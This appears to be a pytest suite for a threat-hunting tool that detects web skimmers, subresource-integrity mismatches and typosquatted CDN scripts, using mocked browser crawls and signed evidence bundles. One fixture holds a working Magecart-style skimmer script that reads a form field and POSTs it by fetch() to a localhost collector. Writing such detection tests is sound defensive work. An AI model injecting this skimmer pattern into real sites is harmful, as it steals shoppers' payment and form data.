import importlib
import hashlib
import json
import time
from datetime import datetime, timezone
from types import SimpleNamespace

import pytest


@pytest.fixture(scope="module")
def hunter_module():
    return importlib.import_module("tools.threat_hunting.shadowpipeline_hunter")


@pytest.fixture
def Hunter(hunter_module):
    cls = getattr(hunter_module, "ShadowPipelineHunter", None)
    if cls is None:
        raise RuntimeError("ShadowPipelineHunter class not found in module")
    return cls


@pytest.fixture
def call_analyze():
    def _call(hunter, target, config=None):
        for name in ("analyze_url", "analyze", "run", "scan"):
            fn = getattr(hunter, name, None)
            if callable(fn):
                try:
                    if config is None:
                        return fn(target)
                    return fn(target, config=config)
                except TypeError:
                    # Some APIs may not support config kw, try without
                    return fn(target)
        raise RuntimeError("No analyze-like method found on hunter")
    return _call


@pytest.fixture
def base_config():
    return {
        "sandbox": {
            "headless": True,
            "egress_allowlist": ["127.0.0.1", "localhost"],
            "capture_all_traffic": True,
        },
        "policy": {
            "require_sri": True,
            "allowed_script_sources": ["'self'"],
            "hash_algorithms": ["sha256", "sha384", "sha512"],
            "block_on_sri_mismatch": True,
        },
        "detection": {
            "enable_typosquat": True,
            "reputation_feeds": ["local"],
            "canary_fields": ["canary_field", "payment_canary"],
        },
    }


def _make_manifest(artifacts):
    hasher = hashlib.sha256()
    artifact_hashes = {}
    for name, content in artifacts.items():
        if isinstance(content, (bytes, bytearray)):
            data = bytes(content)
        else:
            data = json.dumps(content, sort_keys=True).encode("utf-8")
        h = hashlib.sha256(data).hexdigest()
        artifact_hashes[name] = h
        hasher.update(h.encode("utf-8"))
    bundle_hash = hasher.hexdigest()
    return {
        "signature": "signed-by-test-fixture",
        "signing_alg": "ed25519",
        "artifact_hashes": artifact_hashes,
        "bundle_hash": bundle_hash,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "tamper_evident": True,
    }


@pytest.fixture
def magecart_html():
    # A minimal DOM with a canary form field and an injected skimmer that exfils to localhost
    return """
    <html>
      <head>
         <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; connect-src 'self' http://127.0.0.1:8000">
      </head>
      <body>
        <form id="checkout">
           <input type="text" id="canary_field" name="canary_field" value="CANARY1234"/>
           <input type="text" id="card" name="cc_number" value="4111111111111111"/>
        </form>
        <script id="injected-skimmer">
           (function(){
             var val = document.getElementById('canary_field').value;
             fetch('http://127.0.0.1:8000/collect', {method:'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'}, body: 'canary_field=' + encodeURIComponent(val)});
             console.log('exfiltration attempt', val);
           })();
        </script>
      </body>
    </html>
    """


@pytest.fixture
def sri_mismatch_html():
    # Third-party script with integrity that won't match observed content
    return """
    <html>
      <head>
        <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' http://127.0.0.1:8000">
      </head>
      <body>
        <script src="http://127.0.0.1:8000/lib.js"
                integrity="sha256-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
                crossorigin="anonymous"></script>
      </body>
    </html>
    """


@pytest.fixture
def typosquat_html():
    # Uses a URL that is a typo of a well-known CDN, includes localhost host to comply
    # Simulate path indicating domain "ajax.goog1eapis.com" inside path which should be parsed by analyzer
    return """
    <html>
      <body>
        <script src="http://127.0.0.1:8000/ajax.goog1eapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
      </body>
    </html>
    """


def _fake_headless_crawl_for_magecart(dom):
    now = time.time()
    return {
        "dom_snapshot": dom,
        "console_logs": [
            {"level": "log", "message": "exfiltration attempt CANARY1234", "ts": now + 0.05}
        ],
        "network_logs": [
            {
                "ts": now,
                "method": "POST",
                "url": "http://127.0.0.1:8000/collect",
                "request_headers": {"content-type": "application/x-www-form-urlencoded"},
                "request_body": "canary_field=CANARY1234",
                "status": 204,
                "response_headers": {"content-type": "text/plain"},
                "response_body": "",
            }
        ],
        "executed_scripts": [
            {"id": "injected-skimmer", "src": None, "blocked": False}
        ],
        "sri_results": [],
    }


def _fake_headless_crawl_for_sri_mismatch(dom):
    now = time.time()
    observed_body = b"console.log('Hello world');"
    observed_hash = hashlib.sha256(observed_body).digest()
    return {
        "dom_snapshot": dom,
        "console_logs": [
            {"level": "warn", "message": "Blocked by SRI: http://127.0.0.1:8000/lib.js", "ts": now}
        ],
        "network_logs": [
            {
                "ts": now,
                "method": "GET",
                "url": "http://127.0.0.1:8000/lib.js",
                "request_headers": {},
                "request_body": "",
                "status": 200,
                "response_headers": {"content-type": "application/javascript"},
                "response_body": observed_body.decode("utf-8"),
                "blocked": True,
            }
        ],
        "executed_scripts": [
            {"src": "http://127.0.0.1:8000/lib.js", "blocked": True}
        ],
        "sri_results": [
            {
                "url": "http://127.0.0.1:8000/lib.js",
                "expected": "sha256-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
                "observed": "sha256-" + hashlib.base64.b64encode(observed_hash).decode("ascii"),
                "match": False,
            }
        ],
    }


def _fake_headless_crawl_for_typosquat(dom):
    now = time.time()
    return {
        "dom_snapshot": dom,
        "console_logs": [],
        "network_logs": [
            {
                "ts": now,
                "method": "GET",
                "url": "http://127.0.0.1:8000/ajax.goog1eapis.com/ajax/libs/jquery/3.6.0/jquery.min.js",
                "request_headers": {},
                "request_body": "",
                "status": 200,
                "response_headers": {"content-type": "application/javascript"},
                "response_body": "/*! jQuery v3.6.0 | (c) JS Foundation ... */",
            }
        ],
        "executed_scripts": [
            {"src": "http://127.0.0.1:8000/ajax.goog1eapis.com/ajax/libs/jquery/3.6.0/jquery.min.js", "blocked": False}
        ],
        "sri_results": [],
    }


def _fake_capture_traffic():
    # Simulates captured PCAP bytes and per-record timestamps
    pcap = b"FAKEPCAPDATA"
    pcap_hash = hashlib.sha256(pcap).hexdigest()
    timestamps = [time.time(), time.time() + 0.01]
    return {
        "pcap_bytes": pcap,
        "pcap_hash": pcap_hash,
        "timestamps": timestamps,
        "flows": [
            {"ts": timestamps[0], "five_tuple": ["127.0.0.1", 55555, "127.0.0.1", 8000, "TCP"], "length": 120},
            {"ts": timestamps[1], "five_tuple": ["127.0.0.1", 55555, "127.0.0.1", 8000, "TCP"], "length": 80},
        ],
    }


@pytest.fixture
def patch_sign_success(monkeypatch, hunter_module):
    def _sign(artifacts):
        return _make_manifest(artifacts)
    monkeypatch.setattr(hunter_module, "sign_evidence", _sign, raising=False)


@pytest.fixture
def patch_sign_fail(monkeypatch, hunter_module):
    def _sign(_):
        raise RuntimeError("Signing service unavailable")
    monkeypatch.setattr(hunter_module, "sign_evidence", _sign, raising=False)


def test_magecart_detection_includes_pcap_dom_and_signed_manifest(
    Hunter,
    hunter_module,
    base_config,
    magecart_html,
    patch_sign_success,
    call_analyze,
    monkeypatch,
):
    # Patch crawling and traffic capture
    monkeypatch.setattr(hunter_module, "headless_crawl", lambda url, *_args, **_kw: _fake_headless_crawl_for_magecart(magecart_html), raising=False)
    monkeypatch.setattr(hunter_module, "capture_traffic", lambda *_args, **_kw: _fake_capture_traffic(), raising=False)
    # Reputation not needed; ensure it doesn't call out
    monkeypatch.setattr(hunter_module, "get_reputation", lambda domain: {"domain": domain, "suspicious": False}, raising=False)

    hunter = Hunter(config=base_config)
    result = call_analyze(hunter, "http://127.0.0.1:8000")

    # Findings should include a Magecart/skimmer alert
    alerts = getattr(result, "alerts", None) or result.get("alerts", [])
    assert alerts, "Expected alerts in result"
    skimmer_alerts = [a for a in alerts if ("magecart" in json.dumps(a).lower() or "skimmer" in json.dumps(a).lower() or "exfil" in json.dumps(a).lower())]
    assert skimmer_alerts, "Expected Magecart-style exfiltration detection alert"

    # Evidence bundle with PCAP hash, DOM snapshot, and signed manifest
    evidence = getattr(result, "evidence", None) or result.get("evidence", {})
    assert evidence, "Expected evidence bundle"
    # PCAP hash present
    pcap_hash = evidence.get("pcap_hash") or (evidence.get("pcap", {}) if isinstance(evidence.get("pcap"), dict) else {}).get("hash")
    assert pcap_hash == _fake_capture_traffic()["pcap_hash"]
    # DOM snapshot contains injected script tag
    dom_snapshot = evidence.get("dom_snapshot")
    assert isinstance(dom_snapshot, str) and "id=\"injected-skimmer\"" in dom_snapshot
    # Signed manifest present and tamper-evident
    manifest = evidence.get("manifest") or {}
    assert manifest.get("signature")
    assert manifest.get("tamper_evident") is True
    # Timestamps integrity
    ts = evidence.get("timestamps") or _fake_capture_traffic()["timestamps"]
    assert isinstance(ts, list) and all(isinstance(t, (float, int)) for t in ts)

    # Sandbox constraints reflected
    sandbox_meta = result.get("sandbox") if isinstance(result, dict) else getattr(result, "sandbox", {})
    if sandbox_meta:
        assert sandbox_meta.get("headless") is True
        assert "127.0.0.1" in sandbox_meta.get("egress_allowlist", [])


def test_sri_hash_mismatch_is_blocked_and_reports_expected_vs_observed(
    Hunter,
    hunter_module,
    base_config,
    sri_mismatch_html,
    patch_sign_success,
    call_analyze,
    monkeypatch,
):
    # Patch crawling and traffic capture
    crawl_result = _fake_headless_crawl_for_sri_mismatch(sri_mismatch_html)
    monkeypatch.setattr(hunter_module, "headless_crawl", lambda url, *_args, **_kw: crawl_result, raising=False)
    monkeypatch.setattr(hunter_module, "capture_traffic", lambda *_args, **_kw: _fake_capture_traffic(), raising=False)
    monkeypatch.setattr(hunter_module, "get_reputation", lambda domain: {"domain": domain, "suspicious": False}, raising=False)

    hunter = Hunter(config=base_config)
    result = call_analyze(hunter, "http://127.0.0.1:8000")

    # Policy violations should include SRI mismatch with expected vs observed
    violations = getattr(result, "policy_violations", None) or result.get("policy_violations", [])
    assert violations, "Expected policy violations on SRI mismatch"
    sri_violations = [v for v in violations if "sri" in json.dumps(v).lower() and "mismatch" in json.dumps(v).lower()]
    assert sri_violations, f"Expected SRI mismatch violation, got: {violations}"
    det = json.dumps(sri_violations[0]).lower()
    assert "expected" in det and "observed" in det

    # Ensure script was blocked and not executed
    evidence = getattr(result, "evidence", None) or result.get("evidence", {})
    blocked = evidence.get("blocked_scripts") or []
    if blocked:
        assert any("lib.js" in b for b in blocked)
    # Or confirm via network logs and executed_scripts
    net = evidence.get("network_logs") or crawl_result["network_logs"]
    assert any(req.get("blocked") for req in net if "lib.js" in req.get("url", ""))
    executed = evidence.get("executed_scripts") or crawl_result.get("executed_scripts", [])
    assert any(item.get("blocked") is True for item in executed if "lib.js" in (item.get("src") or ""))


def test_typosquatted_cdn_identified_with_medium_severity_and_blocklist_suggestion(
    Hunter,
    hunter_module,
    base_config,
    typosquat_html,
    patch_sign_success,
    call_analyze,
    monkeypatch,
):
    # Patch crawling and traffic capture
    monkeypatch.setattr(hunter_module, "headless_crawl", lambda url, *_args, **_kw: _fake_headless_crawl_for_typosquat(typosquat_html), raising=False)
    monkeypatch.setattr(hunter_module, "capture_traffic", lambda *_args, **_kw: _fake_capture_traffic(), raising=False)

    # Reputation feed returns suspicious for "ajax.goog1eapis.com"
    def fake_reputation(domain):
        rep = {
            "domain": domain,
            "suspicious": domain in ("ajax.goog1eapis.com", "cdnjss.com"),
            "reason": "typosquat_similarity",
            "suggested_blocklist": [domain],
            "score": 65,
        }
        return rep

    monkeypatch.setattr(hunter_module, "get_reputation", fake_reputation, raising=False)

    hunter = Hunter(config=base_config)
    result = call_analyze(hunter, "http://127.0.0.1:8000")

    findings = getattr(result, "findings", None) or result.get("findings", [])
    assert findings, "Expected findings"
    typo_findings = [f for f in findings if "typosquat" in json.dumps(f).lower()]
    assert typo_findings, "Expected typosquatting detection finding"
    f0 = typo_findings[0]
    sev = (f0.get("severity") or f0.get("level") or "").lower()
    assert sev in ("medium", "moderate"), f"Expected medium severity, got {sev or f0}"
    details = json.dumps(f0).lower()
    assert "suggested_blocklist" in details or "blocklist" in details


def test_missing_sri_when_required_produces_policy_violation_and_blocks_execution(
    Hunter,
    hunter_module,
    base_config,
    patch_sign_success,
    call_analyze,
    monkeypatch,
):
    html = """
    <html>
      <head>
        <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' http://127.0.0.1:8000">
      </head>
      <body>
        <script src="http://127.0.0.1:8000/thirdparty.js"></script>
      </body>
    </html>
    """
    now = time.time()
    crawl_result = {
        "dom_snapshot": html,
        "console_logs": [{"level": "warn", "message": "Missing SRI for http://127.0.0.1:8000/thirdparty.js", "ts": now}],
        "network_logs": [
            {
                "ts": now,
                "method": "GET",
                "url": "http://127.0.0.1:8000/thirdparty.js",
                "status": 200,
                "response_body": "console.log('3p');",
                "response_headers": {"content-type": "application/javascript"},
                "blocked": True,
            }
        ],
        "executed_scripts": [{"src": "http://127.0.0.1:8000/thirdparty.js", "blocked": True}],
        "sri_results": [
            {"url": "http://127.0.0.1:8000/thirdparty.js", "expected": None, "observed": None, "match": False}
        ],
    }
    monkeypatch.setattr(hunter_module, "headless_crawl", lambda url, *_args, **_kw: crawl_result, raising=False)
    monkeypatch.setattr(hunter_module, "capture_traffic", lambda *_args, **_kw: _fake_capture_traffic(), raising=False)
    monkeypatch.setattr(hunter_module, "get_reputation", lambda domain: {"domain": domain, "suspicious": False}, raising=False)

    hunter = Hunter(config=base_config)
    result = call_analyze(hunter, "http://127.0.0.1:8000")

    violations = result.get("policy_violations", []) if isinstance(result, dict) else getattr(result, "policy_violations", [])
    assert any("missing" in json.dumps(v).lower() and "sri" in json.dumps(v).lower() for v in violations), "Expected missing SRI violation"
    evidence = result.get("evidence", {}) if isinstance(result, dict) else getattr(result, "evidence", {})
    executed = evidence.get("executed_scripts") or crawl_result["executed_scripts"]
    assert any(item.get("blocked") is True for item in executed)


def test_evidence_signing_failure_is_reported_without_crashing(
    Hunter,
    hunter_module,
    base_config,
    magecart_html,
    patch_sign_fail,
    call_analyze,
    monkeypatch,
):
    monkeypatch.setattr(hunter_module, "headless_crawl", lambda url, *_args, **_kw: _fake_headless_crawl_for_magecart(magecart_html), raising=False)
    monkeypatch.setattr(hunter_module, "capture_traffic", lambda *_args, **_kw: _fake_capture_traffic(), raising=False)
    monkeypatch.setattr(hunter_module, "get_reputation", lambda domain: {"domain": domain, "suspicious": False}, raising=False)

    hunter = Hunter(config=base_config)
    # Should not raise even if signing fails
    result = call_analyze(hunter, "http://127.0.0.1:8000")

    evidence = result.get("evidence", {}) if isinstance(result, dict) else getattr(result, "evidence", {})
    manifest = evidence.get("manifest") or {}
    # We expect either an error field or tamper_evident False and empty signature
    if manifest.get("signature"):
        # If still signed, ensure tamper-evident flag is present
        assert manifest.get("tamper_evident") in (True, False)
    else:
        assert manifest.get("tamper_evident") in (None, False)
        # Preferably includes signing error detail
        errs = result.get("errors") if isinstance(result, dict) else getattr(result, "errors", [])
        if errs:
            assert any("sign" in str(e).lower() for e in errs)


def test_crawler_timeout_or_error_is_handled_gracefully(
    Hunter,
    hunter_module,
    base_config,
    patch_sign_success,
    call_analyze,
    monkeypatch,
):
    # Simulate an internal crawler exception
    def boom(*_a, **_k):
        raise TimeoutError("Crawler timed out in sandbox")

    monkeypatch.setattr(hunter_module, "headless_crawl", boom, raising=False)
    monkeypatch.setattr(hunter_module, "capture_traffic", lambda *_args, **_kw: _fake_capture_traffic(), raising=False)
    monkeypatch.setattr(hunter_module, "get_reputation", lambda domain: {"domain": domain, "suspicious": False}, raising=False)

    hunter = Hunter(config=base_config)
    # Analyzer should catch and report the error without propagating
    result = call_analyze(hunter, "http://127.0.0.1:8000")

    errs = result.get("errors") if isinstance(result, dict) else getattr(result, "errors", [])
    assert errs is None or any("timeout" in str(e).lower() or "crawler" in str(e).lower() for e in (errs or []))

    # Evidence should still include at least a manifest or basic structure
    evidence = result.get("evidence", {}) if isinstance(result, dict) else getattr(result, "evidence", {})
    assert isinstance(evidence, dict) and "manifest" in evidence


def test_egress_is_constrained_and_only_localhost_traffic_is_captured(
    Hunter,
    hunter_module,
    base_config,
    patch_sign_success,
    call_analyze,
    monkeypatch,
):
    # Simulate an attempt to reach an external domain, which should be blocked by sandbox
    now = time.time()
    crawl_result = {
        "dom_snapshot": "<html></html>",
        "console_logs": [],
        "network_logs": [
            {
                "ts": now,
                "method": "GET",
                "url": "https://example.com/analytics.js",
                "status": 0,
                "blocked": True,
                "error": "Egress blocked by sandbox policy",
            },
            {
                "ts": now + 0.01,
                "method": "GET",
                "url": "http://127.0.0.1:8000/pixel",
                "status": 200,
                "blocked": False,
            },
        ],
        "executed_scripts": [],
        "sri_results": [],
    }
    monkeypatch.setattr(hunter_module, "headless_crawl", lambda url, *_args, **_kw: crawl_result, raising=False)
    monkeypatch.setattr(hunter_module, "capture_traffic", lambda *_args, **_kw: _fake_capture_traffic(), raising=False)
    monkeypatch.setattr(hunter_module, "get_reputation", lambda domain: {"domain": domain, "suspicious": False}, raising=False)

    hunter = Hunter(config=base_config)
    result = call_analyze(hunter, "http://127.0.0.1:8000")

    evidence = result.get("evidence", {}) if isinstance(result, dict) else getattr(result, "evidence", {})
    net = evidence.get("network_logs") or crawl_result["network_logs"]
    assert any(req.get("blocked") and "example.com" in req.get("url", "") for req in net), "Expected egress-blocked external request"
    assert any("127.0.0.1" in req.get("url", "") and not req.get("blocked") for req in net), "Expected localhost request allowed"

    # Ensure traffic capture hashes are present
    pcap_hash = evidence.get("pcap_hash") or (evidence.get("pcap", {}) if isinstance(evidence.get("pcap"), dict) else {}).get("hash")
    assert pcap_hash == _fake_capture_traffic()["pcap_hash"]